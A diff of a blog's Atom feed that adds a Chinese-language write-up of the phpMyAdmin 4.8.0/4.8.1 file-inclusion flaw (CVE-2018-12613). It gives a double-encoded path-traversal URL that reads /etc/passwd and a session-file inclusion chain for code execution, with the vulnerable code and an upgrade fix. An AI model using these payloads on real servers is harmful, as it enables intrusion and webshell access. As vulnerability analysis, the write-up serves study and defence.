@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
-    <generator uri="https://gohugo.io/" version="0.146.3">Hugo</generator><title type="html"><![CDATA[l1uyun]]></title>
+    <generator uri="https://gohugo.io/" version="0.147.0">Hugo</generator><title type="html"><![CDATA[l1uyun]]></title>
     
     
     
             <link href="https://l1uyun.one/tags/sec/cve/" rel="alternate" type="text/html" title="html" />
             <link href="https://l1uyun.one/tags/sec/cve/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
-    <updated>2025-04-14T09:22:31+00:00</updated>
+    <updated>2025-04-29T04:24:56+00:00</updated>
     
     
     
@@ -16,9 +16,9 @@
         
         <entry>
             <title type="html"><![CDATA[phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞]]></title>
-            <link href="https://l1uyun.one/posts/phpmyadmin-4/" rel="alternate" type="text/html" />
+            <link href="https://l1uyun.one/posts/phpmyadmin-4.0.x4.6.2_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="alternate" type="text/html" />
             
-                <id>https://l1uyun.one/posts/phpmyadmin-4/</id>
+                <id>https://l1uyun.one/posts/phpmyadmin-4.0.x4.6.2_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
             
             
             <published>2024-09-18T16:59:09+08:00</published>
@@ -122,6 +122,110 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 <p><a href="https://www.exploit-db.com/exploits/40185" target="_blank" rel="noopener nofollow noreferrer" >phpMyAdmin 4.6.2 - (Authenticated) Remote Code Execution - PHP webapps Exploit</a></p>
 <p><a href="https://www.cnblogs.com/angly/p/3157736.html" target="_blank" rel="noopener nofollow noreferrer" >PHP安全之慎用preg_replace的/e修饰符 - y&rsquo;ang - 博客园</a></p>
 <p><a href="https://xz.aliyun.com/t/7836" target="_blank" rel="noopener nofollow noreferrer" >CVE-2016-5734 phpmyadmin后台代码执行漏洞复现</a></p>
+]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://l1uyun.one/tags/sec/vulhub" term="sec/vulhub" label="sec/vulhub" />
+                             
+                                <category scheme="https://l1uyun.one/tags/sec/cve" term="sec/cve" label="sec/cve" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        
+        <entry>
+            <title type="html"><![CDATA[phpmyadmin-4.8.1远程文件包含]]></title>
+            <link href="https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="alternate" type="text/html" />
+            
+                <id>https://l1uyun.one/posts/phpmyadmin-4.8.1%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
+            
+            
+            <published>2024-09-18T15:33:13+08:00</published>
+            <updated>2024-09-19T22:35:37+08:00</updated>
+            
+            
+            <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
+<p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
+<p>这个漏洞刚刚打演练的时候用过,分析一下原理</p>
+<h2 id="影响版本">影响版本</h2>
+<p>phpmyadmin 4.8.0 &amp; 4.8.1</p>
+<h2 id="前提条件">前提条件</h2>
+<p>能够进入后台,也就是要有数据库的凭据</p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="php文件包含">php文件包含</h3>
+<p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。
+文件包含相关函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>require<span style="color:#f92672">()</span><span style="color:#75715e">#函数出现错误的时候，会直接报错并退出程序的执行</span>
+</span></span><span style="display:flex;"><span>require_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
+</span></span><span style="display:flex;"><span>include<span style="color:#f92672">()</span><span style="color:#75715e">#在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span>
+</span></span><span style="display:flex;"><span>include_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
+</span></span></code></pre></div><p>文件包含分为本地文件包含和远程文件包含</p>
+<p>远程文件包含利用需要下面这两个配置文件都开启
+当allow_url_include和allow_url_fopen都开启时，可以通过利用远程url或者php://协议直接getshell，即远程文件包含，
+但allow_url_include在php5.2之后默认为off，利用机会有限。
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_1.png" alt=""  />
+当allow_url_include and allow_url_fopen均为off 在window主机环境下仍然可以进行远程文件执行，用445端口SMB协议进行远程加载。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>直接访问下面的路径,能输出passwd内容那就是有了</p>
+<p><code>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/phpmyadmin-4.8.1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab_image_2.png" alt=""  /></p>
+<p>利用方式的话,就是先在sql栏执行一下select命令,然后去包含session文件,就能获得webshell,进而拿shell</p>
+<p>可以执行一下<code>SELECT &lt;?=phpinfo()?&gt;;</code>，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可：</p>
+<p>对应的sessions文件是 /tmp/sess_sessionid
+<a href="phpmyadmin-4_8_1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%ef%bc%88CVE-2018-12613%ef%bc%89.pdf">phpmyadmin-4_8_1远程文件包含漏洞（CVE-2018-12613）</a></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>简单来说就是phpmyadmin对用户传入的参数直接进行了包含,并且黑名单的检验不严格,可以绕过,从而导致了LFI</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// If we have a valid target, let&#39;s load that script instead
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#66d9ef">empty</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^index/&#39;</span>, $_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span> <span style="color:#a6e22e">in_array</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>], $target_blacklist)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">Core</span><span style="color:#f92672">::</span><span style="color:#a6e22e">checkPageValidity</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span> $_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 黑名单
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$target_blacklist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;import.php&#39;</span>, <span style="color:#e6db74">&#39;export.php&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>然后就是在phpmyadmin中,执行sql语句之后,会存储在session文件中,如果包含这个文件,就能让select里面的php代码被执行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php?/../../../../../../../../etc/passwd
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Windows环境下利用需要对?进行编码</span>
+</span></span><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php%253f/../../../../../../../../tmp/sess_21faa6130eaba2b5e04e313bfacc60d4
+</span></span></code></pre></div><h2 id="漏洞发现">漏洞发现</h2>
+<p>进入后台之后,查看版本信息</p>
+<h2 id="漏洞修复">漏洞修复</h2>
+<p>升级phpmyadmin版本</p>
+<h2 id="相关漏洞">相关漏洞</h2>
+<p><a href="phpMyAdmin-4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e.md">phpMyAdmin-4.0.x—4.6.2_远程代码执行漏洞</a></p>
+<h2 id="漏洞总结">漏洞总结</h2>
+<p>这个漏洞刚刚演练的时候利用过,比较熟悉了&hellip;
+记忆这个漏洞</p>
+<ul>
+<li>组件:phpmyadmin</li>
+<li>版本:4.8.1&amp;4.8.0</li>
+<li>漏洞类型:文件包含</li>
+</ul>
+<p>假设你在尝试利用,挖掘这个漏洞</p>
+<ul>
+<li>漏洞产生点:首页的target参数</li>
+<li>漏洞类型:文件包含</li>
+<li>漏洞利用方法:通过对sessions文件进行包含从而实现rce</li>
+<li>遇到问题之后的解决方案:</li>
+</ul>
 ]]></content>
             
                  
